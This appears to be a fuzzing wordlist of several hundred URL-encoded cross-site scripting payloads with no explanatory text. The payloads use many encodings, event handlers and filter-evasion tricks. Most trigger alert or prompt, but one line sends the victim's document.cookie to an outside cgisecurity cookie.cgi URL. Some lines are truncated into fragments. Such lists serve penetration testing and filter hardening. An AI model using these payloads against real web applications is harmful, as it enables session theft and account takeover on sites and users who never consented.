+'%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%22%3E%3C/script%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%22%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+'%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+'%3E%3C/script%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%22%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+'%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+&'%22%3E%3Cscript%3Ealert(/X/)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(/X/)%3C/script%3E  
+'%3E%3Cscript%3Ealert(/X/)%3C/script%3E  
+%26'%22%3E%3Cscript%3Ealert(%2FX%2F)%3C%2Fscript%3E%3D  
+&'%22%3EPHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4  
+&'%22%3E/'-C%3CFEP=  
+&'%22%3E/u%7B3c%7D/u%7B73%7D/u%7B63%7D/u%7B72%7D/u%7B69%7D/u%7B70%7D/u%7B74%7D/u%7B3e%7D/u%7B61%7D/u%7B6c%7D/u%7B65%7D/u%7B72%7D/u%7B74%7D/u%7B28%7D/u%7B2f%7D/u%7B78%7D/u%7B73%7D/u%7B73%7D/u%7B2f%7D/u%7B29%7D/u%7B3c%7D/u%7B2f%7D/u%7B73%7D/u%7B63%7D/u%7B72%7D/u%7B69%7D/u%7B70%7D/u%7B74%7D/u%7B3e%7D  
+&'%22%3E/u003c/u0073/u0063/u0072/u0069/u0070/u0074/u003e/u0061/u006c/u0065/u0072/u0074/u0028/u002f/u0078/u0073/u0073/u002f/u0029/u003c/u002f/u0073/u0063/u0072/u0069/u0070/u0074/u003e  
+&'%22%3E0x3c7363726970743e616c657274282f7873732f293c2f7363726970743e  
+&'%22%3E-1,54,38,53,44,51,55,-1,36,47,40,53,55,-1,-1,59,54,54,-1,-1,-1,-1,54,38,53,44,51,55,-1  
+&'%22%3EPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==  
+&'%22%3E3e7470697263732f3c292f7373782f287472656c613e7470697263733c  
+&'%22%3Echr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62).chr(97).chr(108).chr(101).chr(114).chr(116).chr(40).chr(47).chr(120).chr(115).chr(115).chr(47).chr(41).chr(60).chr(47).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62)  
+&'%22%3ETypeError:%20Cannot%20read%20property%20'$content$'%20of%20undefined  
+&'%22%3E/74/163/143/162/151/160/164/76/141/154/145/162/164/50/57/170/163/163/57/51/74/57/163/143/162/151/160/164/76  
+&'%22%3E%3Cscript%3Ealert(/X/)%3C/%C4%81%C4%83%C4%85%3E  
+&'%22%3E%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%
+&'%22%3E/uff1c/uff53/uff43/uff52/uff49/uff50/uff54/uff1e/uff41/uff4c/uff45/uff52/uff54/uff08/uff0f/uff58/uff53/uff53/uff0f/uff09/uff1c/uff0f/uff53/uff43/uff52/uff49/uff50/uff54/uff1e  
+&'%22%3E&lt;script&gt;alert&lpar;&sol;X&sol;&rpar;&lt;&sol;script&gt;  
+&'%22%3E&lt;script&gt;alert(/X/)&lt;/script&gt;  
+&'%22%3EDescription:Syntax%20error%20Msg:Unexpected%20token%20%3C%20)  
+%3C/script%3E%3Csvg%20onload='-/%22/-alert(1)//'%3E  
+%22%3E%3C/script%3E%3Csvg%20onload='-/%22/-alert(1)//'%3E  
+'%3E%3C/script%3E%3Csvg%20onload='-/%22/-alert(1)//'%3E  
+%3C!--%20--!%3E%3Cscript%3Ealert(X)%3C/script%3E--%3E  
+%22%3E%3C!--%20--!%3E%3Cscript%3Ealert(X)%3C/script%3E--%3E  
+'%3E%3C!--%20--!%3E%3Cscript%3Ealert(X)%3C/script%3E--%3E  
+%3C![CDATA[%3Cscript%3Ealert(X)%3C/script%3E]]%3E  
+%22%3E%3C![CDATA[%3Cscript%3Ealert(X)%3C/script%3E]]%3E  
+'%3E%3C![CDATA[%3Cscript%3Ealert(X)%3C/script%3E]]%3E  
+[data%20%221%3Cdiv%20style=width:expression(prompt(1))%3E%22]  
++onerror=alert(1)%3E/  
++onerror=prompt(1)%3E/  
+?variable=%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72%69%74%79%20%2e%63%6f%6d%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63%%2075%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e  
+?  
+/  
+%E2%80%9C%3E%3Cscript%20%3Ealert(1)%3C/script%20%3E  
+%E2%80%9C%3E%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E  
+%E2%80%9C%3e%3cscript%3ealert(1)%3c/script%3e  
+%E2%80%9C%3E%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3C/script%3Eipt%3E  
+%22%3E%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3C/script%3Eipt%3E  
+'%3E%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3C/script%3Eipt%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%3Cxml%20onreadystatechange=alert(1)%3E  
+%22%3E%3Cxml%20onreadystatechange=alert(1)%3E  
+'%3E%3Cxml%20onreadystatechange=alert(1)%3E  
+%3Cstyle%20onreadystatechange=alert(1)%3E  
+%22%3E%3Cstyle%20onreadystatechange=alert(1)%3E  
+'%3E%3Cstyle%20onreadystatechange=alert(1)%3E  
+%3Ciframe%20onreadystatechange=alert(1)%3E  
+%22%3E%3Ciframe%20onreadystatechange=alert(1)%3E  
+'%3E%3Ciframe%20onreadystatechange=alert(1)%3E  
+%3Cobject%20onerror=alert(1)%3E  
+%22%3E%3Cobject%20onerror=alert(1)%3E  
+'%3E%3Cobject%20onerror=alert(1)%3E  
+%3Cobject%20type=image%20src=X.gif%20onreadystatechange=alert(1)%3E%3C/object%3E  
+%22%3E%3Cobject%20type=image%20src=X.gif%20onreadystatechange=alert(1)%3E%3C/object%3E  
+'%3E%3Cobject%20type=image%20src=X.gif%20onreadystatechange=alert(1)%3E%3C/object%3E  
+%3Cimg%20type=image%20src=X.gif%20onreadystatechange=alert(1)%3E  
+%22%3E%3Cimg%20type=image%20src=X.gif%20onreadystatechange=alert(1)%3E  
+'%3E%3Cimg%20type=image%20src=X.gif%20onreadystatechange=alert(1)%3E  
+%3Cinput%20type=image%20src=X.gif%20onreadystatechange=alert(1)%3E  
+%22%3E%3Cinput%20type=image%20src=X.gif%20onreadystatechange=alert(1)%3E  
+'%3E%3Cinput%20type=image%20src=X.gif%20onreadystatechange=alert(1)%3E  
+%3Cisindex%20type=image%20src=X.gif%20onreadystatechange=alert(1)%3E  
+%22%3E%3Cisindex%20type=image%20src=X.gif%20onreadystatechange=alert(1)%3E  
+'%3E%3Cisindex%20type=image%20src=X.gif%20onreadystatechange=alert(1)%3E  
+%3Cscript%20onreadystatechange=alert(1)%3E  
+%22%3E%3Cscript%20onreadystatechange=alert(1)%3E  
+'%3E%3Cscript%20onreadystatechange=alert(1)%3E  
+%3Cbgsound%20onpropertychange=alert(1)%3E  
+%22%3E%3Cbgsound%20onpropertychange=alert(1)%3E  
+'%3E%3Cbgsound%20onpropertychange=alert(1)%3E  
+%3Cbody%20onbeforeactivate=alert(1)%3E  
+%22%3E%3Cbody%20onbeforeactivate=alert(1)%3E  
+'%3E%3Cbody%20onbeforeactivate=alert(1)%3E  
+%3Cbody%20onactivate=alert(1)%3E  
+%22%3E%3Cbody%20onactivate=alert(1)%3E  
+'%3E%3Cbody%20onactivate=alert(1)%3E  
+%3Cbody%20onfocusin=alert(1)%3E  
+%22%3E%3Cbody%20onfocusin=alert(1)%3E  
+'%3E%3Cbody%20onfocusin=alert(1)%3E  
+%3Cinput%20onblur=alert(1)%20autofocus%3E%3Cinput%20autofocus%3E  
+%22%3E%3Cinput%20onblur=alert(1)%20autofocus%3E%3Cinput%20autofocus%3E  
+'%3E%3Cinput%20onblur=alert(1)%20autofocus%3E%3Cinput%20autofocus%3E  
+%3Cbody%20onscroll=alert(1)%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cinput%20autofocus%3E  
+%22%3E%3Cbody%20onscroll=alert(1)%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cinput%20autofocus%3E  
+'%3E%3Cbody%20onscroll=alert(1)%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cinput%20autofocus%3E  
+%3C/a%20onmousemove=alert(1)%3E  
+%22%3E%3C/a%20onmousemove=alert(1)%3E  
+'%3E%3C/a%20onmousemove=alert(1)%3E  
+%3Caudio%20src=1%20onerror=alert(1)%3E  
+%22%3E%3Caudio%20src=1%20onerror=alert(1)%3E  
+'%3E%3Caudio%20src=1%20onerror=alert(1)%3E  
+%3Cobject%20data=javascript:alert(1)%3E  
+%22%3E%3Cobject%20data=javascript:alert(1)%3E  
+'%3E%3Cobject%20data=javascript:alert(1)%3E  
+%3Ciframe%20src=javascript:alert(1)%3E  
+%22%3E%3Ciframe%20src=javascript:alert(1)%3E  
+'%3E%3Ciframe%20src=javascript:alert(1)%3E  
+%3Cembed%20src=javascript:alert(1)%3E  
+%22%3E%3Cembed%20src=javascript:alert(1)%3E  
+'%3E%3Cembed%20src=javascript:alert(1)%3E  
+%3Cform%20id=test%20/%3E%3Cbutton%20form=test%20formaction=javascript:alert(1)%3E  
+%22%3E%3Cform%20id=test%20/%3E%3Cbutton%20form=test%20formaction=javascript:alert(1)%3E  
+'%3E%3Cform%20id=test%20/%3E%3Cbutton%20form=test%20formaction=javascript:alert(1)%3E  
+%3Cevent-source%20src=javascript:alert(1)%3E  
+%22%3E%3Cevent-source%20src=javascript:alert(1)%3E  
+'%3E%3Cevent-source%20src=javascript:alert(1)%3E  
+%3Cx%20style=x:expression(alert(1))%3E  
+%22%3E%3Cx%20style=x:expression(alert(1))%3E  
+'%3E%3Cx%20style=x:expression(alert(1))%3E  
+%3Cx%20style=behavior:url(  
+%22%3E%3Cx%20style=behavior:url(  
+'%3E%3Cx%20style=behavior:url(  
+%3CiMg%20onerror=alert(1)%20src=a%3E  
+%22%3E%3CiMg%20onerror=alert(1)%20src=a%3E  
+'%3E%3CiMg%20onerror=alert(1)%20src=a%3E  
+%3Cimg/onerror=alert(1)%20src=a%3E  
+%22%3E%3Cimg/onerror=alert(1)%20src=a%3E  
+'%3E%3Cimg/onerror=alert(1)%20src=a%3E  
+%3Cimg[%09]onerror=alert(1)%20src=a%3E  
+%22%3E%3Cimg[%09]onerror=alert(1)%20src=a%3E  
+'%3E%3Cimg[%09]onerror=alert(1)%20src=a%3E  
+%3Cimg[%0d]onerror=alert(1)%20src=a%3E  
+%22%3E%3Cimg[%0d]onerror=alert(1)%20src=a%3E  
+'%3E%3Cimg[%0d]onerror=alert(1)%20src=a%3E  
+%3Cimg[%0a]onerror=alert(1)%20src=a%3E  
+%22%3E%3Cimg[%0a]onerror=alert(1)%20src=a%3E  
+'%3E%3Cimg[%0a]onerror=alert(1)%20src=a%3E  
+%3Cimg/%E2%80%9Donerror=alert(1)%20src=a%3E  
+%22%3E%3Cimg/%E2%80%9Donerror=alert(1)%20src=a%3E  
+'%3E%3Cimg/%E2%80%9Donerror=alert(1)%20src=a%3E  
+%3Cimg/%E2%80%99onerror=alert(1)%20src=a%3E  
+%22%3E%3Cimg/%E2%80%99onerror=alert(1)%20src=a%3E  
+'%3E%3Cimg/%E2%80%99onerror=alert(1)%20src=a%3E  
+%3Cimg/anyjunk/onerror=alert(1)%20src=a%3E  
+%22%3E%3Cimg/anyjunk/onerror=alert(1)%20src=a%3E  
+'%3E%3Cimg/anyjunk/onerror=alert(1)%20src=a%3E  
+%3Cimg%20onerror=%E2%80%9Dalert(1)%E2%80%9Dsrc=a%3E  
+%22%3E%3Cimg%20onerror=%E2%80%9Dalert(1)%E2%80%9Dsrc=a%3E  
+'%3E%3Cimg%20onerror=%E2%80%9Dalert(1)%E2%80%9Dsrc=a%3E  
+%3Cimg%20onerror=%E2%80%99alert(1)%E2%80%99src=a%3E  
+%22%3E%3Cimg%20onerror=%E2%80%99alert(1)%E2%80%99src=a%3E  
+'%3E%3Cimg%20onerror=%E2%80%99alert(1)%E2%80%99src=a%3E  
+%3Cimg%20onerror=%60alert(1)%60src=a%3E  
+%22%3E%3Cimg%20onerror=%60alert(1)%60src=a%3E  
+'%3E%3Cimg%20onerror=%60alert(1)%60src=a%3E  
+%3Ciframe%20src=j&  
+%22%3E%3Ciframe%20src=j&  
+'%3E%3Ciframe%20src=j&  
+%3Cimg%20onerror=a&  
+%22%3E%3Cimg%20onerror=a&  
+'%3E%3Cimg%20onerror=a&  
+%3Cimg%20onerror=a&  
+%22%3E%3Cimg%20onerror=a&  
+'%3E%3Cimg%20onerror=a&  
+%3Cimg%20onerror=a&  
+%22%3E%3Cimg%20onerror=a&  
+'%3E%3Cimg%20onerror=a&  
+%3Cimg%20onerror=a&  
+%22%3E%3Cimg%20onerror=a&  
+'%3E%3Cimg%20onerror=a&  
+%3Cimg%20onerror=a&  
+%22%3E%3Cimg%20onerror=a&  
+'%3E%3Cimg%20onerror=a&  
+%3Cimg%20onerror=a&  
+%22%3E%3Cimg%20onerror=a&  
+'%3E%3Cimg%20onerror=a&  
+%3Cimg%20onerror=a&  
+%22%3E%3Cimg%20onerror=a&  
+'%3E%3Cimg%20onerror=a&  
+%253cimg%20onerror=alert(1)%20src=a%253e  
+%3cimg%20onerror=alert(1)%20src=a%3e  
+%3Cimg%20onerror=alert(1)%20src=a%3E  
+%22%3E%3Cimg%20onerror=alert(1)%20src=a%3E  
+'%3E%3Cimg%20onerror=alert(1)%20src=a%3E  
+%C2%ABimg%20onerror=alert(1)%20src=a%C2%BB  
+%3Cscript%3Ea/u006cert(1);%3C/script%3E  
+%22%3E%3Cscript%3Ea/u006cert(1);%3C/script%3E  
+'%3E%3Cscript%3Ea/u006cert(1);%3C/script%3E  
+%3Cscript%3Eeval(%E2%80%98a/u006cert(1)%E2%80%99);%3C/script%3E  
+%22%3E%3Cscript%3Eeval(%E2%80%98a/u006cert(1)%E2%80%99);%3C/script%3E  
+'%3E%3Cscript%3Eeval(%E2%80%98a/u006cert(1)%E2%80%99);%3C/script%3E  
+%3Cscript%3Eeval(%E2%80%98a/x6cert(1)%E2%80%99);%3C/script%3E  
+%22%3E%3Cscript%3Eeval(%E2%80%98a/x6cert(1)%E2%80%99);%3C/script%3E  
+'%3E%3Cscript%3Eeval(%E2%80%98a/x6cert(1)%E2%80%99);%3C/script%3E  
+%3Cscript%3Eeval(%E2%80%98a/154ert(1)%E2%80%99);%3C/script%3E  
+%22%3E%3Cscript%3Eeval(%E2%80%98a/154ert(1)%E2%80%99);%3C/script%3E  
+'%3E%3Cscript%3Eeval(%E2%80%98a/154ert(1)%E2%80%99);%3C/script%3E  
+%3Cscript%3Eeval(%E2%80%98a/l/ert/(1/)%E2%80%99);%3C/script%3E  
+%22%3E%3Cscript%3Eeval(%E2%80%98a/l/ert/(1/)%E2%80%99);%3C/script%3E  
+'%3E%3Cscript%3Eeval(%E2%80%98a/l/ert/(1/)%E2%80%99);%3C/script%3E  
+%3Cscript%3Eeval(%E2%80%98al%E2%80%99+%E2%80%99ert(1)%E2%80%99);%3C/script%3E  
+%22%3E%3Cscript%3Eeval(%E2%80%98al%E2%80%99+%E2%80%99ert(1)%E2%80%99);%3C/script%3E  
+'%3E%3Cscript%3Eeval(%E2%80%98al%E2%80%99+%E2%80%99ert(1)%E2%80%99);%3C/script%3E  
+%3Cscript%3Eeval(String.fromCharCode(75,67,70));%3C/script%3E  
+%22%3E%3Cscript%3Eeval(String.fromCharCode(75,67,70));%3C/script%3E  
+'%3E%3Cscript%3Eeval(String.fromCharCode(75,67,70));%3C/script%3E  
+%3Cscript%3Eeval(atob(%E2%80%98amF2YXNjcmlwdDphbGVydCgxKQ%E2%80%99));%3C/script%3E  
+%22%3E%3Cscript%3Eeval(atob(%E2%80%98amF2YXNjcmlwdDphbGVydCgxKQ%E2%80%99));%3C/script%3E  
+'%3E%3Cscript%3Eeval(atob(%E2%80%98amF2YXNjcmlwdDphbGVydCgxKQ%E2%80%99));%3C/script%3E  
+%3Cscript%3E%E2%80%99alert(1)%E2%80%99.replace(/.+/,eval)%3C/script%3E  
+%22%3E%3Cscript%3E%E2%80%99alert(1)%E2%80%99.replace(/.+/,eval)%3C/script%3E  
+'%3E%3Cscript%3E%E2%80%99alert(1)%E2%80%99.replace(/.+/,eval)%3C/script%3E  
+%3Cscript%3Efunction::[%E2%80%98alert%E2%80%99](1)%3C/script%3E  
+%22%3E%3Cscript%3Efunction::[%E2%80%98alert%E2%80%99](1)%3C/script%3E  
+'%3E%3Cscript%3Efunction::[%E2%80%98alert%E2%80%99](1)%3C/script%3E  
+%3Cimg%20onerror=&  
+%22%3E%3Cimg%20onerror=&  
+'%3E%3Cimg%20onerror=&  
+%3Cscript%20language=vbs%3EMsgBox%201%3C/script%3E  
+%22%3E%3Cscript%20language=vbs%3EMsgBox%201%3C/script%3E  
+'%3E%3Cscript%20language=vbs%3EMsgBox%201%3C/script%3E  
+%3Cimg%20onerror=%E2%80%9Dvbs:MsgBox%201%E2%80%9D%20src=a%3E  
+%22%3E%3Cimg%20onerror=%E2%80%9Dvbs:MsgBox%201%E2%80%9D%20src=a%3E  
+'%3E%3Cimg%20onerror=%E2%80%9Dvbs:MsgBox%201%E2%80%9D%20src=a%3E  
+%3Cimg%20onerror=MsgBox+1%20language=vbs%20src=a%3E  
+%22%3E%3Cimg%20onerror=MsgBox+1%20language=vbs%20src=a%3E  
+'%3E%3Cimg%20onerror=MsgBox+1%20language=vbs%20src=a%3E  
+%3CSCRIPT%20LANGUAGE=VBS%3EMSGBOX%201%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20LANGUAGE=VBS%3EMSGBOX%201%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20LANGUAGE=VBS%3EMSGBOX%201%3C/SCRIPT%3E  
+%3CIMG%20ONERROR=%E2%80%9DVBS:MSGBOX%201%E2%80%9D%20SRC=A%3E  
+%22%3E%3CIMG%20ONERROR=%E2%80%9DVBS:MSGBOX%201%E2%80%9D%20SRC=A%3E  
+'%3E%3CIMG%20ONERROR=%E2%80%9DVBS:MSGBOX%201%E2%80%9D%20SRC=A%3E  
+%3Cscript%3EexecScript(%E2%80%9CMsgBox%201%E2%80%9D,%E2%80%9Dvbscript%E2%80%9D);%3C/script%3E  
+%22%3E%3Cscript%3EexecScript(%E2%80%9CMsgBox%201%E2%80%9D,%E2%80%9Dvbscript%E2%80%9D);%3C/script%3E  
+'%3E%3Cscript%3EexecScript(%E2%80%9CMsgBox%201%E2%80%9D,%E2%80%9Dvbscript%E2%80%9D);%3C/script%3E  
+%3Cscript%20language=vbs%3EexecScript(%E2%80%9Calert(1)%E2%80%9D)%3C/script%3E  
+%22%3E%3Cscript%20language=vbs%3EexecScript(%E2%80%9Calert(1)%E2%80%9D)%3C/script%3E  
+'%3E%3Cscript%20language=vbs%3EexecScript(%E2%80%9Calert(1)%E2%80%9D)%3C/script%3E  
+%3CSCRIPT%20LANGUAGE=VBS%3EEXECSCRIPT(LCASE(%E2%80%9CALERT(1)%E2%80%9D))%20%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20LANGUAGE=VBS%3EEXECSCRIPT(LCASE(%E2%80%9CALERT(1)%E2%80%9D))%20%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20LANGUAGE=VBS%3EEXECSCRIPT(LCASE(%E2%80%9CALERT(1)%E2%80%9D))%20%3C/SCRIPT%3E  
+%3CIMG%20ONERROR=%E2%80%9DVBS:EXECSCRIPT%20LCASE(%E2%80%98ALERT(1)%E2%80%99)%E2%80%9D%20SRC=A%3E  
+%22%3E%3CIMG%20ONERROR=%E2%80%9DVBS:EXECSCRIPT%20LCASE(%E2%80%98ALERT(1)%E2%80%99)%E2%80%9D%20SRC=A%3E  
+'%3E%3CIMG%20ONERROR=%E2%80%9DVBS:EXECSCRIPT%20LCASE(%E2%80%98ALERT(1)%E2%80%99)%E2%80%9D%20SRC=A%3E  
+%3Cimg%20onerror=%E2%80%9DVBScript.Encode:  
+%22%3E%3Cimg%20onerror=%E2%80%9DVBScript.Encode:  
+'%3E%3Cimg%20onerror=%E2%80%9DVBScript.Encode:  
+%3Cimg%20language=%E2%80%9DJScript.Encode%E2%80%9D%20onerror=%E2%80%9D  
+%22%3E%3Cimg%20language=%E2%80%9DJScript.Encode%E2%80%9D%20onerror=%E2%80%9D  
+'%3E%3Cimg%20language=%E2%80%9DJScript.Encode%E2%80%9D%20onerror=%E2%80%9D  
+%3Cscript%3Evar%20a%20=%20%E2%80%98%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Evar%20a%20=%20%E2%80%98%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Evar%20a%20=%20%E2%80%98%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%E2%80%9C%3Cscript%3Eprompt(1)%3C/script%3E  
+%22%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+'%3E%3Cscript%3Eprompt(1)%3C/script%3E  
+%E2%80%9C;alert(1)//  
+%E2%80%98-alert(1)-%E2%80%99  
+%E2%80%9C%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%E2%80%9C;prompt(1)//  
+%E2%80%98-prompt(1)-%E2%80%99  
+%3Cinput%20type=%22text%22%20AUTOFOCUS%20onfocus=alert(1)%3E  
+%22%3E%3Cinput%20type=%22text%22%20AUTOFOCUS%20onfocus=alert(1)%3E  
+'%3E%3Cinput%20type=%22text%22%20AUTOFOCUS%20onfocus=alert(1)%3E  
+%3Cscript/x20type=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+%22%3E%3Cscript/x20type=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+'%3E%3Cscript/x20type=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+%3Cscript/x3Etype=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+%22%3E%3Cscript/x3Etype=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+'%3E%3Cscript/x3Etype=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+%3Cscript/x0Dtype=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+%22%3E%3Cscript/x0Dtype=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+'%3E%3Cscript/x0Dtype=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+%3Cscript/x09type=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+%22%3E%3Cscript/x09type=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+'%3E%3Cscript/x09type=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+%3Cscript/x0Ctype=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+%22%3E%3Cscript/x0Ctype=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+'%3E%3Cscript/x0Ctype=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+%3Cscript/x2Ftype=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+%22%3E%3Cscript/x2Ftype=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+'%3E%3Cscript/x2Ftype=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+%3Cscript/x0Atype=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+%22%3E%3Cscript/x0Atype=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+'%3E%3Cscript/x0Atype=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E  
+'%60%22%3E%3C/x3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%60%22%3E%3C/x00script%3Ejavascript:alert(1)%3C/script%3E  
+%3Cimg%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/img%3E  
+%22%3E%3Cimg%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/img%3E  
+'%3E%3Cimg%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/img%3E  
+%3Caudio%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/audio%3E  
+%22%3E%3Caudio%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/audio%3E  
+'%3E%3Caudio%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/audio%3E  
+%3Cvideo%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/video%3E  
+%22%3E%3Cvideo%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/video%3E  
+'%3E%3Cvideo%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/video%3E  
+%3Cbody%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/body%3E  
+%22%3E%3Cbody%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/body%3E  
+'%3E%3Cbody%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/body%3E  
+%3Cimage%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/image%3E  
+%22%3E%3Cimage%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/image%3E  
+'%3E%3Cimage%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/image%3E  
+%3Cobject%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/object%3E  
+%22%3E%3Cobject%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/object%3E  
+'%3E%3Cobject%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/object%3E  
+%3Cscript%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/script%3E  
+%22%3E%3Cscript%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/script%3E  
+'%3E%3Cscript%20src=1%20href=1%20onerror=%22javascript:alert(1)%22%3E%3C/script%3E  
+%3Csvg%20onResize%20svg%20onResize=%22javascript:javascript:alert(1)%22%3E%3C/svg%20onResize%3E  
+%22%3E%3Csvg%20onResize%20svg%20onResize=%22javascript:javascript:alert(1)%22%3E%3C/svg%20onResize%3E  
+'%3E%3Csvg%20onResize%20svg%20onResize=%22javascript:javascript:alert(1)%22%3E%3C/svg%20onResize%3E  
+%3Ctitle%20onPropertyChange%20title%20onPropertyChange=%22javascript:javascript:alert(1)%22%3E%3C/title%20onPropertyChange%3E  
+%22%3E%3Ctitle%20onPropertyChange%20title%20onPropertyChange=%22javascript:javascript:alert(1)%22%3E%3C/title%20onPropertyChange%3E  
+'%3E%3Ctitle%20onPropertyChange%20title%20onPropertyChange=%22javascript:javascript:alert(1)%22%3E%3C/title%20onPropertyChange%3E  
+%3Ciframe%20onLoad%20iframe%20onLoad=%22javascript:javascript:alert(1)%22%3E%3C/iframe%20onLoad%3E  
+%22%3E%3Ciframe%20onLoad%20iframe%20onLoad=%22javascript:javascript:alert(1)%22%3E%3C/iframe%20onLoad%3E  
+'%3E%3Ciframe%20onLoad%20iframe%20onLoad=%22javascript:javascript:alert(1)%22%3E%3C/iframe%20onLoad%3E  
+%3Cbody%20onMouseEnter%20body%20onMouseEnter=%22javascript:javascript:alert(1)%22%3E%3C/body%20onMouseEnter%3E  
+%22%3E%3Cbody%20onMouseEnter%20body%20onMouseEnter=%22javascript:javascript:alert(1)%22%3E%3C/body%20onMouseEnter%3E  
+'%3E%3Cbody%20onMouseEnter%20body%20onMouseEnter=%22javascript:javascript:alert(1)%22%3E%3C/body%20onMouseEnter%3E  
+%3Cbody%20onFocus%20body%20onFocus=%22javascript:javascript:alert(1)%22%3E%3C/body%20onFocus%3E  
+%22%3E%3Cbody%20onFocus%20body%20onFocus=%22javascript:javascript:alert(1)%22%3E%3C/body%20onFocus%3E  
+'%3E%3Cbody%20onFocus%20body%20onFocus=%22javascript:javascript:alert(1)%22%3E%3C/body%20onFocus%3E  
+%3Cframeset%20onScroll%20frameset%20onScroll=%22javascript:javascript:alert(1)%22%3E%3C/frameset%20onScroll%3E  
+%22%3E%3Cframeset%20onScroll%20frameset%20onScroll=%22javascript:javascript:alert(1)%22%3E%3C/frameset%20onScroll%3E  
+'%3E%3Cframeset%20onScroll%20frameset%20onScroll=%22javascript:javascript:alert(1)%22%3E%3C/frameset%20onScroll%3E  
+%3Cscript%20onReadyStateChange%20script%20onReadyStateChange=%22javascript:javascript:alert(1)%22%3E%3C/script%20onReadyStateChange%3E  
+%22%3E%3Cscript%20onReadyStateChange%20script%20onReadyStateChange=%22javascript:javascript:alert(1)%22%3E%3C/script%20onReadyStateChange%3E  
+'%3E%3Cscript%20onReadyStateChange%20script%20onReadyStateChange=%22javascript:javascript:alert(1)%22%3E%3C/script%20onReadyStateChange%3E  
